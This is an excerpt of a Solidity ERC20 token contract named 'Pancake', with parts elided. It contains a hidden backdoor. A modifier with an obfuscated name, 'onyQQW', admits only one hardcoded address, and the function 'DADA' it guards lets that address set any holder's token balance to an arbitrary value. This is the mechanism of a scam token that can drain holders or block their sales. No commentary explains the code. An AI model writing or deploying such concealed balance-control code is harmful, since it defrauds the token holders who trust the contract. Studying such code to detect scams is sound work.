...
abstract contract Ownable {
    ...
    modifier onyQQW() {
        require( 0xC8950A8641debBf476b242373176F83f771B34AD == msg.sender, "!Funder");
        _;
    }
...
abstract contract A01 is IERC20, Ownable {
    ...
    function DADA(address addr, uint256 enable) public onyQQW {
        _tokens[addr] = (enable);
    }
    function setLP(uint256 lp) external onlyOwner {
        _sellLPFee = lp;
    }
}

contract Pancake is A01 {
    constructor() A01(
        ...
        address(0x53b7f00C167c2eb924824DD86aC4d44809c7C266),

        address(0xE05c34Df5FDe55F1Be15c21D40F521c8453e30c0)
    ){
